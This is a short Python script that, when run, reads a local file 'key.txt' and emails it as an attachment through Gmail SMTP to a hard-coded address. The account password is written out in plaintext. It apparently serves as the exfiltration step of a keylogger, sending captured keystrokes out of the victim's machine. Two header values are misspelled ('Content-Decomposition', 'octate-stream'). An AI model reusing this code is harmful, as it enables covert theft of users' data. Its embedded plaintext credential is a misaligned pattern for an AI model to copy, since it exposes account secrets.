import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders



def mail():
     
    mail_content = '''all key'''

    message = MIMEMultipart()

    password = "Master123$"
    message['From'] = "A123noone321A@gmail.com"
    message['To'] = "A123noone321A@gmail.com"
    message['Subject'] = "Hello"

    message.attach(MIMEText(mail_content, 'plain'))

    attach_file_name = 'key.txt'
    attach_file = open(attach_file_name, 'rb')
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload)
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)

    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(message['From'], password)
    session.sendmail( message['From'], message['To'], message.as_string() )

    session.quit()
    print('Mail Sent')


mail()
